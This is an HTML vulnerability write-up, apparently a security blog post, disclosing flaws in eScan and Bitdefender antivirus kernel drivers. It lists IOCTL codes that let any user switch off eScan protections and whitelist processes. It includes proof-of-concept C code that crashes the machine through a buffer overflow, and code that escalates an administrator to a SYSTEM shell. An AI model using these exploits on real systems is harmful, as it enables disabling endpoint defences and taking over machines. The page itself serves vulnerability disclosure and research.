@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>DreadSec | More AV Bullshit</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Vulnerabilities in eScan and Bitdefender antivirus drivers">
+  <style>
+    :root {
+      --bg-main:#02030a;
+      --bg-panel:#050713;
+      --bg-card:#070918;
+      --accent:#ff1446;
+      --accent-soft:rgba(255,20,70,0.14);
+      --accent-alt:#35b7ff;
+      --text-main:#f5f5f7;
+      --text-muted:#8d91a5;
+      --border-soft:rgba(255,255,255,0.06);
+      --radius-xl:22px;
+      --radius-md:14px;
+      --font-sans:system-ui,-apple-system,BlinkMacSystemFont,"SF Pro Text",sans-serif;
+      --shadow-soft:0 22px 60px rgba(0,0,0,0.9);
+      --transition-fast:.18s ease-out;
+      --transition-med:.26s ease-out;
+    }
+    * {
+      box-sizing:border-box;
+      margin:0;
+      padding:0;
+    }
+    body {
+      font-family:var(--font-sans);
+      background:var(--bg-main);
+      color:var(--text-main);
+      min-height:100vh;
+      overflow-x:hidden;
+    }
+    a {
+      color:inherit;
+      text-decoration:none;
+    }
+
+    .bg-orbit {
+      position:fixed;
+      inset:-40px;
+      background:
+        radial-gradient(circle at top left,rgba(255,20,70,0.14),transparent),
+        radial-gradient(circle at top right,rgba(53,183,255,0.09),transparent),
+        radial-gradient(circle at bottom,rgba(255,20,70,0.08),transparent);
+      mix-blend-mode:screen;
+      pointer-events:none;
+      z-index:-3;
+      animation:bgShift 16s ease-in-out infinite alternate;
+    }
+    @keyframes bgShift {
+      0% {opacity:.6;transform:translate3d(0,0,0);}
+      50% {opacity:1;transform:translate3d(-10px,-6px,0) scale(1.02);}
+      100% {opacity:.85;transform:translate3d(6px,-4px,0);}
+    }
+
+    .bg-grid {
+      position:fixed;
+      inset:0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+      background-size:90px 90px;
+      opacity:.16;
+      pointer-events:none;
+      z-index:-4;
+      animation:gridDrift 38s linear infinite;
+    }
+    @keyframes gridDrift {
+      0% {transform:translate3d(0,0,0);}
+      50% {transform:translate3d(-24px,-18px,0) scale(1.03);}
+      100% {transform:translate3d(0,0,0);}
+    }
+
+    .page-wrap {
+      max-width:1240px;
+      margin:0 auto;
+      padding:20px 16px 40px;
+      position:relative;
+      z-index:1;
+    }
+
+    header {
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:16px;
+      padding:14px 16px;
+      border-radius:var(--radius-xl);
+      background:radial-gradient(circle at top left,rgba(255,20,70,0.12),transparent);
+      border:1px solid var(--border-soft);
+      backdrop-filter:blur(26px);
+      box-shadow:var(--shadow-soft);
+      margin-bottom:18px;
+    }
+    .brand {
+      display:flex;
+      flex-direction:column;
+      gap:4px;
+    }
+    .brand-title {
+      font-size:1.7rem;
+      font-weight:700;
+      letter-spacing:.16em;
+      text-transform:uppercase;
+    }
+    .brand-title span {
+      color:var(--accent);
+    }
+    .brand-sub {
+      font-size:.72rem;
+      letter-spacing:.14em;
+      text-transform:uppercase;
+      color:var(--text-muted);
+    }
+    .nav {
+      display:flex;
+      align-items:center;
+      gap:10px;
+      font-size:.78rem;
+      color:var(--text-muted);
+      flex-wrap:wrap;
+    }
+    .nav a {
+      padding:6px 10px;
+      border-radius:999px;
+      border:1px solid transparent;
+      transition:all var(--transition-fast);
+    }
+    .nav a:hover {
+      color:var(--accent);
+      border-color:var(--accent-soft);
+      background:rgba(0,0,0,0.86);
+    }
+    .nav-pill {
+      border-color:var(--accent-soft);
+      color:var(--accent);
+    }
+
+    .progress-shell {
+      width:100%;
+      height:3px;
+      border-radius:999px;
+      background:rgba(255,255,255,0.06);
+      overflow:hidden;
+      margin-bottom:14px;
+    }
+    #scrollProgress {
+      width:0;
+      height:100%;
+      background:linear-gradient(90deg,var(--accent),var(--accent-alt));
+      transform-origin:left center;
+      transform:scaleX(0);
+      transition:transform 0.08s linear;
+    }
+
+    .article-layout {
+      display:grid;
+      grid-template-columns:minmax(0,260px) minmax(0,1fr);
+      gap:20px;
+      align-items:flex-start;
+    }
+
+    .article-meta {
+      background:var(--bg-panel);
+      border-radius:var(--radius-xl);
+      padding:16px 14px 12px;
+      border:1px solid var(--border-soft);
+      box-shadow:var(--shadow-soft);
+      backdrop-filter:blur(24px);
+      position:sticky;
+      top:20px;
+    }
+    .back-link {
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      font-size:.76rem;
+      color:var(--text-muted);
+      margin-bottom:10px;
+      padding:5px 8px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,0.06);
+      background:rgba(0,0,0,0.6);
+      cursor:pointer;
+      transition:all var(--transition-fast);
+    }
+    .back-link:hover {
+      color:var(--accent);
+      border-color:var(--accent-soft);
+    }
+    .back-link span.arrow {
+      font-size:.72rem;
+    }
+
+    .cve-badge {
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      padding:4px 9px;
+      border-radius:999px;
+      background:var(--accent-soft);
+      color:var(--accent);
+      font-size:.7rem;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+      margin-bottom:4px;
+    }
+    .meta-block {
+      font-size:.72rem;
+      color:var(--text-muted);
+      margin-bottom:10px;
+      margin-top:8px;
+      line-height:1.5;
+    }
+    .meta-block strong {
+      color:var(--accent-alt);
+      font-weight:500;
+    }
+
+    .article-toc-title {
+      font-size:.72rem;
+      text-transform:uppercase;
+      letter-spacing:.13em;
+      color:var(--text-muted);
+      margin-top:12px;
+      margin-bottom:6px;
+    }
+    .article-toc {
+      list-style:none;
+      font-size:.72rem;
+      display:flex;
+      flex-direction:column;
+      gap:3px;
+    }
+    .article-toc a {
+      color:var(--text-muted);
+      padding:3px 0;
+      border-left:2px solid transparent;
+      padding-left:8px;
+      transition:all var(--transition-fast);
+    }
+    .article-toc a:hover {
+      color:var(--accent-alt);
+      border-color:var(--accent-soft);
+    }
+    .article-toc a.active {
+      color:var(--accent);
+      border-color:var(--accent);
+    }
+
+    .article-main {
+      background:var(--bg-panel);
+      border-radius:var(--radius-xl);
+      padding:18px 16px 18px;
+      border:1px solid var(--border-soft);
+      box-shadow:var(--shadow-soft);
+      backdrop-filter:blur(24px);
+    }
+
+    .article-title {
+      font-size:1.5rem;
+      font-weight:650;
+      line-height:1.3;
+      margin-bottom:6px;
+    }
+    .article-subtitle {
+      font-size:.82rem;
+      color:var(--text-muted);
+      margin-bottom:12px;
+    }
+    .article-meta-row {
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      font-size:.7rem;
+      color:var(--text-muted);
+      margin-bottom:12px;
+    }
+    .article-meta-pill {
+      display:inline-flex;
+      align-items:center;
+      gap:4px;
+      padding:3px 8px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,0.08);
+      background:rgba(0,0,0,0.6);
+    }
+    .dot {
+      width:4px;
+      height:4px;
+      border-radius:999px;
+      background:rgba(255,255,255,0.32);
+    }
+
+    .article-tag-row {
+      display:flex;
+      flex-wrap:wrap;
+      gap:6px;
+      margin-bottom:14px;
+    }
+    .article-tag {
+      font-size:.64rem;
+      padding:3px 8px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,0.1);
+      background:rgba(3,4,12,0.98);
+      color:var(--accent-alt);
+    }
+
+    .callout-tldr {
+      border-radius:var(--radius-md);
+      border:1px solid rgba(255,255,255,0.14);
+      background:linear-gradient(135deg,rgba(53,183,255,0.1),rgba(2,3,12,0.98));
+      padding:10px 11px;
+      font-size:.76rem;
+      margin-bottom:18px;
+    }
+    .callout-tldr-title {
+      text-transform:uppercase;
+      letter-spacing:.14em;
+      font-size:.64rem;
+      color:var(--accent-alt);
+      margin-bottom:4px;
+    }
+    .callout-tldr p {
+      color:var(--text-main);
+      line-height:1.6;
+    }
+
+    .article-section {
+      margin-bottom:20px;
+      padding-left:6px;
+      border-left:2px solid rgba(255,255,255,0.06);
+    }
+    .article-section h2 {
+      font-size:1rem;
+      margin-bottom:6px;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+    }
+    .article-section p {
+      font-size:.8rem;
+      color:var(--text-muted);
+      line-height:1.7;
+      margin-bottom:8px;
+    }
+    .article-section ul {
+      padding-left:16px;
+      margin-bottom:8px;
+    }
+    .article-section li {
+      font-size:.8rem;
+      color:var(--text-muted);
+      line-height:1.7;
+      margin-bottom:4px;
+    }
+
+    .code-block {
+      font-family:ui-monospace,Menlo,Consolas,monospace;
+      font-size:.74rem;
+      background:#050713;
+      border-radius:var(--radius-md);
+      border:1px solid rgba(255,255,255,0.14);
+      padding:8px 10px;
+      margin:8px 0;
+      overflow-x:auto;
+      position:relative;
+    }
+    .code-block-label {
+      position:absolute;
+      top:4px;
+      right:8px;
+      font-size:.6rem;
+      text-transform:uppercase;
+      letter-spacing:.12em;
+      color:var(--text-muted);
+    }
+    .code-block pre {
+      margin-top:10px;
+      white-space:pre;
+    }
+
+    .note-box {
+      border-radius:var(--radius-md);
+      border:1px dashed rgba(255,255,255,0.2);
+      background:rgba(5,7,18,0.9);
+      padding:8px 10px;
+      font-size:.76rem;
+      color:var(--text-muted);
+      margin-top:10px;
+    }
+
+    .ioctl-table {
+      width:100%;
+      border-collapse:collapse;
+      font-size:.74rem;
+      margin:8px 0;
+    }
+    .ioctl-table th {
+      text-align:left;
+      padding:6px 8px;
+      color:var(--accent-alt);
+      border-bottom:1px solid rgba(255,255,255,0.12);
+      font-weight:500;
+      font-size:.68rem;
+      text-transform:uppercase;
+      letter-spacing:.1em;
+    }
+    .ioctl-table td {
+      padding:4px 8px;
+      color:var(--text-muted);
+      border-bottom:1px solid rgba(255,255,255,0.04);
+      font-family:ui-monospace,Menlo,Consolas,monospace;
+    }
+    .ioctl-table td:last-child {
+      font-family:var(--font-sans);
+    }
+
+    .footer-meta {
+      margin-top:18px;
+      padding-top:10px;
+      border-top:1px solid rgba(255,255,255,0.08);
+      font-size:.72rem;
+      color:var(--text-muted);
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      justify-content:space-between;
+    }
+
+    @media (max-width:860px) {
+      header {
+        flex-direction:column;
+        align-items:flex-start;
+      }
+      .page-wrap {
+        padding:16px 14px 32px;
+      }
+      .article-layout {
+        grid-template-columns:1fr;
+      }
+      .article-meta {
+        position:static;
+        margin-bottom:12px;
+      }
+    }
+
+    @media (max-width:520px) {
+      .page-wrap {
+        padding:14px 10px 26px;
+      }
+      header {
+        padding:10px 12px;
+      }
+      .brand-title {
+        font-size:1.45rem;
+      }
+      .brand-sub {
+        font-size:.68rem;
+      }
+      .nav {
+        font-size:.72rem;
+      }
+      .article-main {
+        padding:14px 12px 16px;
+      }
+      .article-title {
+        font-size:1.25rem;
+      }
+      .article-section h2 {
+        font-size:.92rem;
+      }
+      .article-section p,
+      .article-section li {
+        font-size:.78rem;
+      }
+      .code-block {
+        font-size:.7rem;
+      }
+      .code-block pre {
+        white-space:pre;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <div class="bg-orbit"></div>
+
+  <div class="page-wrap">
+    <header>
+      <div class="brand">
+        <div class="brand-title">dread<span>sec</span>&#9760;&#65038;&#65038;</div>
+        <div class="brand-sub">vulnerability &amp; security research &bull; whiskey and 0xcc</div>
+      </div>
+      <nav class="nav">
+        <a href="https://dreadsec.co" class="nav-pill">main</a>
+        <a href="https://dreadsec.co">write-ups</a>
+      </nav>
+    </header>
+
+    <div class="progress-shell">
+      <div id="scrollProgress"></div>
+    </div>
+
+    <main class="article-layout">
+      <aside class="article-meta">
+        <button class="back-link" type="button" onclick="window.location.href='https://dreadsec.co'">
+          <span class="arrow">&#10235;</span>
+          <span>back to index</span>
+        </button>
+
+        <div class="cve-badge"><span>cve-2026-xxxx</span></div>
+        <div class="cve-badge"><span>cve-2026-xxxx</span></div>
+        <div class="cve-badge"><span>cve-2026-xxxx</span></div>
+
+        <div class="meta-block">
+          <div><strong>Category:</strong> Vulnerability Research</div>
+          <div><strong>Published:</strong> Jul 22, 2026</div>
+          <div><strong>Read time:</strong> ~15 min</div>
+          <div><strong>Difficulty:</strong> Intermediate</div>
+        </div>
+
+        <div class="article-toc-title">sections</div>
+        <ul class="article-toc" id="articleToc">
+          <li><a href="#scope">What I Looked At</a></li>
+          <li><a href="#methodology">How I Found Them</a></li>
+          <li><a href="#killswitch">CVE-2026-XXXX: Killing the AV</a></li>
+          <li><a href="#bsod">CVE-2026-XXXX: The Black Screen(?)</a></li>
+          <li><a href="#lpe">CVE-2026-XXXX: Admin to SYSTEM</a></li>
+        </ul>
+      </aside>
+
+      <article class="article-main">
+        <header>
+          <h1 class="article-title">eScan and Bitdefender Are Now Victims</h1>
+          <p class="article-subtitle"></p>
+
+          <div class="article-meta-row">
+            <div class="article-meta-pill">
+              <span class="dot"></span>
+              <span>missing authorization</span>
+            </div>
+            <div class="article-meta-pill">
+              <span class="dot"></span>
+              <span>buffer overflow</span>
+            </div>
+            <div class="article-meta-pill">
+              <span class="dot"></span>
+              <span>privilege escalation</span>
+            </div>
+          </div>
+
+          <div class="article-tag-row">
+            <span class="article-tag">Kernel</span>
+            <span class="article-tag">Windows</span>
+            <span class="article-tag">Antivirus</span>
+            <span class="article-tag">CVE / Zero-Day</span>
+            <span class="article-tag">Minifilter</span>
+          </div>
+        </header>
+
+        <section class="callout-tldr" id="tldr">
+          <div class="callout-tldr-title">tl;dr</div>
+          <p>
+            Two antivirus kernel drivers, zero authentication on their control interfaces. eScan's minifilter lets any unprivileged user disable the entire AV stack or blue-screen (black, I hate that they did this) the machine with a single IOCTL. Bitdefender's scanning minifilter lets any admin escalate to SYSTEM in under a second. Two eScan vulns, one Bitdefender vuln, three working PoCs, all found through static analysis of decompiled pseudocode.
+          </p>
+          <br>
+          <p>
+            Yeah, yeah, I hear you, "who gives a shit if an Administrator escalates to SYSTEM? Ever heard of SysInternals dumbass?" Yeah, it does sound like shit, but Microsoft says Administrator and SYSTEM are in different security boundaries, so if it's an issue to them, it is to me.
+          </p>
+        </section>
+
+        <section class="article-section" id="scope">
+          <h2>What I Looked At</h2>
+          <p>
+            Looked at two antivirus kernel drivers from different vendors. Both load into the kernel for real-time file monitoring and threat scanning.
+          </p>
+          <ul>
+            <li><strong>mwfsmflt.sys</strong>, an eScan Anti-Virus minifilter. Handles file protection, registry monitoring, USB access control, and log management. Exposes a device object at <code>\\.\mwfsmfltr</code> for usermode communication.</li>
+            <li><strong>trufos.sys</strong>, a Bitdefender minifilter that handles core background tasks. Communicates through a filter port at <code>\TRFCOMMPORT</code>.</li>
+          </ul>
+          <p>
+            The bugs are not subtle.
+          </p>
+        </section>
+
+        <section class="article-section" id="killswitch">
+          <h2>CVE-2026-XXXX: Killing the AV</h2>
+          <p>
+            mwfsmflt.sys is an eScan Anti-Virus minifilter. It creates a device object for usermode communication and never applies a security descriptor to it.
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">DriverEntry, sub_14E18</div>
+            <pre>
+v8 = IoCreateDevice(DriverObject, 0x10u, &amp;DestinationString, 0x22u, 0x100u, 0, &amp;DeviceObject);
+if ( v8 &gt;= 0 )
+{
+    v8 = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DestinationString);
+    // ...
+    DriverObject-&gt;MajorFunction[0]  = (PDRIVER_DISPATCH)sub_1380C;   // IRP_MJ_CREATE
+    DriverObject-&gt;MajorFunction[2]  = (PDRIVER_DISPATCH)sub_13858;   // IRP_MJ_CLOSE
+    DriverObject-&gt;MajorFunction[14] = (PDRIVER_DISPATCH)sub_138A4;   // IRP_MJ_DEVICE_CONTROL
+}</pre>
+          </div>
+
+          <p>
+            Device type 0x22, which is <code>FILE_DEVICE_UNKNOWN</code>. Characteristics 0x100. And a zero for the security descriptor parameter. No follow-up call to <code>IoCreateDeviceSecure</code>. No manual DACL. The device inherits a permissive default that lets any authenticated user open it.
+          </p>
+          <p>
+            The <code>IRP_MJ_CREATE</code> handler confirms it:
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">sub_1380C</div>
+            <pre>
+__int64 __fastcall sub_1380C(__int64 a1, IRP *a2)
+{
+  int v2 = dword_4D658;
+  a2-&gt;IoStatus.Information = 0;
+  if ( v2 &amp;&amp; v2 != 5 &amp;&amp; v2 != 7 )
+    DbgPrint("IRP_MJ_CREATE\n");
+  a2-&gt;IoStatus.Status = 0;
+  IofCompleteRequest(a2, 0);
+  return 0;
+}</pre>
+          </div>
+
+          <p>
+            A debug log gated by a global flag. Then <code>STATUS_SUCCESS</code> and <code>IofCompleteRequest</code>. No token check. No PID check. Nothing. Any user gets a handle.
+          </p>
+          <p>
+            With a handle, you own the IOCTL dispatch. The driver exposes nine protection flags, each controlled by a dedicated IOCTL code. Send the disable code and the driver writes zero to the corresponding global DWORD. The minifilter callback checks that DWORD, reads zero, returns <code>FLT_PREOP_SUCCESS_NO_CALLBACK</code>, and that protection category goes dark.
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">IOCTL 0x222444 handler</div>
+            <pre>
+// disable local file protection
+dword_4D664 = 0;
+if ( dword_4D658 &amp;&amp; dword_4D658 != 5 &amp;&amp; dword_4D658 != 7 )
+  DbgPrint("Local File Protection Off\n");</pre>
+          </div>
+
+          <p>
+            No input buffer read. No <code>InputBufferLength</code> check. The on/off state is determined entirely by which IOCTL code you send. Separate codes for enable and disable. Zero authorization on any of them.
+          </p>
+
+          <table class="ioctl-table">
+            <thead>
+              <tr><th>IOCTL</th><th>Global</th><th>Protection</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>0x222430</td><td>dword_4D660</td><td>Network file protection</td></tr>
+              <tr><td>0x222444</td><td>dword_4D664</td><td>Local file protection</td></tr>
+              <tr><td>0x222460</td><td>dword_4D668</td><td>USB modification logging</td></tr>
+              <tr><td>0x22246C</td><td>dword_4D66C</td><td>Registry protection</td></tr>
+              <tr><td>0x2224DC</td><td>dword_4D670</td><td>Rename operation monitoring</td></tr>
+              <tr><td>0x2224BC</td><td>dword_4D674</td><td>Change notification monitoring</td></tr>
+              <tr><td>0x222538</td><td>dword_4D678</td><td>Sensitive file protection</td></tr>
+              <tr><td>0x2224E4</td><td>dword_44110</td><td>Ebackup path protection</td></tr>
+              <tr><td>0x222508</td><td>dword_44114</td><td>USB access control</td></tr>
+            </tbody>
+          </table>
+
+          <p>
+            There is also a PID whitelist. IOCTL 0x222450 feeds into <code>sub_129C0</code>, which acquires spinlock <code>qword_4D620</code> and appends your PID to a global array. Whitelisted PIDs bypass all behavioral filtering in the minifilter callbacks.
+          </p>
+          <p>
+            The dispatch has zero security-related API calls. No <code>SeSinglePrivilegeCheck</code>, no <code>SeAccessCheck</code>, no <code>PsGetCurrentProcessId</code> comparison. Every handler in the table follows the same pattern: set a global, return success.
+          </p>
+        </section>
+
+        <section class="article-section" id="bsod">
+          <h2>CVE-2026-XXXX: The Black Screen(?)</h2>
+          <p>
+            Same driver. Same missing DACL. Different IOCTL.
+          </p>
+          <p>
+            IOCTL 0x222464 is the log path handler. Unlike the flag toggles that just write a constant to a global, this one takes a wide-character string from the input buffer and copies it into <code>word_4FF30</code>, a fixed-size global in the <code>.data</code> section.
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">IOCTL 0x222464, verbatim decompiler output</div>
+            <pre>
+v21 = a2-&gt;AssociatedIrp.MasterIrp;
+if ( dword_4D658 &amp;&amp; dword_4D658 != 5 &amp;&amp; dword_4D658 != 7 )
+  DbgPrint("Setting Log File name.\n");
+if ( v21 )
+{
+  v22 = (char *)((char *)&amp;word_4FF30 - (char *)v21);
+  do
+  {
+    Type = v21-&gt;Type;
+    *(_WORD *)&amp;v22[(_QWORD)v21] = v21-&gt;Type;
+    v21 = (struct _IRP *)((char *)v21 + 2);
+  }
+  while ( Type );
+}</pre>
+          </div>
+
+          <p>
+            The loop has no bounds check. The only guard is <code>if ( v21 )</code>, a null-pointer check. <code>InputBufferLength</code> is never consulted anywhere in the handler.
+          </p>
+          <p>
+            <code>word_4FF30</code> sits in the <code>.data</code> section with a fixed allocation. The globals immediately after it include the protection flags, the PID whitelist array, and other driver state. An 8192-WCHAR payload steamrolls through all of it and the kernel bugchecks before the IOCTL even returns.
+          </p>
+          <p>
+            Compare this to a normal handler in the same dispatch:
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">IOCTL 0x222444, safe handler</div>
+            <pre>
+dword_4D664 = 0;
+if ( dword_4D658 &amp;&amp; dword_4D658 != 5 &amp;&amp; dword_4D658 != 7 )
+  DbgPrint("Local File Protection Off\n");</pre>
+          </div>
+
+          <p>
+            No copy loop. No variable-length input. Just a constant assignment. IOCTL 0x222464 is the only handler in the driver that processes variable-length data, and it is the only one without bounds checking.
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">proof of concept</div>
+            <pre>
+HANDLE hDev = CreateFileW(L"\\\\.\\mwfsmfltr",
+    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+
+DWORD payload_wchars = 8192;
+WCHAR *payload = VirtualAlloc(NULL, payload_wchars * sizeof(WCHAR),
+    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+for (DWORD i = 0; i &lt; payload_wchars - 1; i++)
+    payload[i] = L'A';
+payload[payload_wchars - 1] = L'\0';
+
+DWORD ret;
+DeviceIoControl(hDev, 0x222464,
+    payload, payload_wchars * sizeof(WCHAR), NULL, 0, &amp;ret, NULL);
+// machine is now dead</pre>
+          </div>
+        </section>
+
+        <section class="article-section" id="lpe">
+          <h2>CVE-2026-XXXX: Admin to SYSTEM</h2>
+          <p>
+            This one is Bitdefender's code.
+          </p>
+          <p>
+            trufos.sys communicates through a filter communication port at <code>\TRFCOMMPORT</code>, built with <code>FltBuildDefaultSecurityDescriptor</code> using <code>FLT_PORT_ALL_ACCESS</code>, 0x1F0001. That restricts connections to administrators and SYSTEM. You need admin to even connect.
+          </p>
+          <p>
+            The port protocol has a handshake, a version negotiation step, and then a command dispatch with 28 handlers. Most of them deal with scanning. Command 23 does something else entirely.
+          </p>
+          <p>
+            Command 23 tells the driver to create a SYSTEM thread and hand you that thread's token.
+          </p>
+          <p>
+            The handshake is simple. First message must contain the DWORD 0x12355321. The driver validates it, sets an internal flag at <code>PortCookie + 12</code>, and from that point dispatches all messages through the real command handler.
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">MessageNotifyCallback, handshake</div>
+            <pre>
+if ( InputBufferLength &gt;= 4 &amp;&amp; OutputBufferLength &gt;= 4
+      &amp;&amp; OutputBuffer &amp;&amp; *InputBuffer == 305484577 )
+{
+  *OutputBuffer = *(_DWORD *)(v12 + 256);
+  if ( ReturnOutputBufferLength )
+    *ReturnOutputBufferLength = 4;
+  *((_BYTE *)PortCookie + 12) = 1;
+}</pre>
+          </div>
+
+          <p>
+            305484577 is 0x12355321 in decimal. Security through obscurity since the constant is right there in the binary.
+          </p>
+          <p>
+            After the handshake, messages flow through <code>sub_14005FE70</code> into the real command dispatcher, <code>sub_14003BCF0</code>. When command 23 comes in, it gets forwarded to <code>sub_1400159C4</code>, which validates input sizes and calls <code>sub_140015500</code>. That function manages the system thread lifecycle. When the flag byte is 1, it spawns a new kernel thread via <code>PsCreateSystemThread</code>. The thread runs <code>HandleInformation</code> as its <code>StartRoutine</code>.
+          </p>
+          <p>
+            Inside <code>HandleInformation</code>, the chain goes like this:
+          </p>
+
+          <div class="code-block">
+            <div class="code-block-label">HandleInformation, token duplication</div>
+            <pre>
+// open the system process
+ClientId.UniqueProcess = PsGetCurrentProcessId();
+ZwOpenProcess(&amp;ProcessHandle, 0x1FFFFFu, &amp;ObjectAttributes, &amp;ClientId);
+
+// open the caller's process
+ClientId.UniqueProcess = StartContext[4].Header.WaitListHead.Blink;  // target PID
+ZwOpenProcess(&amp;TargetProcessHandle, 0x1FFFFFu, &amp;ObjectAttributes, &amp;ClientId);
+
+// open system process token
+v7(ProcessHandle, 6, 512, &amp;ExistingTokenHandle);  // ZwOpenProcessTokenEx
+
+// create impersonation copy
+ZwDuplicateToken(ExistingTokenHandle, 4u, &amp;ObjectAttributes, 1u, TokenImpersonation, &amp;SourceHandle);
+
+// inject into caller's process
+ZwDuplicateObject(
+    ProcessHandle,         
+    SourceHandle,           
+    TargetProcessHandle,    
+    &amp;TargetHandle,       
+    0,                      
+    0,                      
+    6u                      
+);
+          </div>
+
+          <p>
+            The driver opens both the system process and your process with <code>PROCESS_ALL_ACCESS</code>, 0x1FFFFF. Opens the system token, duplicates it as an impersonation token via <code>ZwDuplicateToken</code> with <code>TOKEN_IMPERSONATE</code> access, and then uses <code>ZwDuplicateObject</code> with <code>DUPLICATE_SAME_ACCESS</code> to inject that handle into your process. The handle value comes back through the reply buffer.
+          </p>
+          <p>
+            The handle carries <code>TOKEN_IMPERSONATE</code> only. Not enough for <code>DuplicateTokenEx</code> directly. But you can bootstrap your way to a full primary token:
+          </p>
+          <ul>
+            <li><code>SetThreadToken</code> to start impersonating SYSTEM</li>
+            <li><code>OpenThreadToken</code> with <code>OpenAsSelf=FALSE</code> to reopen the token with full access while impersonating</li>
+            <li><code>DuplicateTokenEx</code> to create a primary token</li>
+            <li><code>CreateProcessWithTokenW</code> to spawn a SYSTEM shell</li>
+          </ul>
+
+          <div class="code-block">
+            <div class="code-block-label">proof of concept, token bootstrap</div>
+            <pre>
+HANDLE hImpToken = (HANDLE)(ULONG_PTR)reply.handle;
+
+SetThreadToken(NULL, hImpToken);
+
+HANDLE hFullToken;
+OpenThreadToken(GetCurrentThread(),
+    TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
+    FALSE, &amp;hFullToken);
+
+HANDLE hPrimary;
+DuplicateTokenEx(hFullToken, MAXIMUM_ALLOWED,
+    NULL, SecurityImpersonation, TokenPrimary, &amp;hPrimary);
+
+RevertToSelf();
+
+wchar_t cmdline[] = L"cmd.exe";
+CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE,
+    NULL, cmdline, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);
+// you now have a SYSTEM shell</pre>
+          </div>
+        </section>
+
+        <div class="footer-meta">
+          <div>
+            All content provided on this page is for disclosure and education purposes only.
+          </div>
+          <div>
+            <span>Research Log</span>
+          </div>
+        </div>
+      </article>
+    </main>
+  </div>
+
+  <script>
+    const progressBar = document.getElementById("scrollProgress");
+    const toc = document.getElementById("articleToc");
+    const tocLinks = toc ? Array.from(toc.querySelectorAll("a")) : [];
+
+    function updateProgress() {
+      const scrollTop = window.scrollY || document.documentElement.scrollTop;
+      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+      const ratio = docHeight > 0 ? scrollTop / docHeight : 0;
+      const clamped = Math.max(0, Math.min(1, ratio));
+      progressBar.style.transform = "scaleX(" + clamped + ")";
+    }
+
+    function updateTocHighlight() {
+      const sections = tocLinks.map(function(link) {
+        var id = link.getAttribute("href").slice(1);
+        return document.getElementById(id);
+      });
+
+      var activeIndex = -1;
+      var offset = 120;
+      sections.forEach(function(sec, idx) {
+        if (!sec) return;
+        var rect = sec.getBoundingClientRect();
+        if (rect.top - offset <= 0) activeIndex = idx;
+      });
+
+      tocLinks.forEach(function(link, idx) {
+        if (idx === activeIndex) link.classList.add("active");
+        else link.classList.remove("active");
+      });
+    }
+
+    window.addEventListener("scroll", function() {
+      updateProgress();
+      updateTocHighlight();
+    });
+    window.addEventListener("load", function() {
+      updateProgress();
+      updateTocHighlight();
+    });
+  </script>
+</body>
+</html>
